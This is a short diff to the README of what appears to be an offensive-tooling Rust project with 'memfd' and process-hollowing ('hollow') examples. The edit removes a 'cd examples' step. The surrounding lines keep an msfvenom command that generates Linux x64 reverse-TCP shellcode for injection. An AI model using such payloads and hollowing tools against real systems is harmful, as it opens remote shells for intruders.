@@ -34,11 +34,6 @@ cargo run --example memfd
 ```
 
 ### hollow
-Change directory into `examples`
-```bash
-cd examples
-```
-
 Use your own shellcode or the provided example
 ```bash
 msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
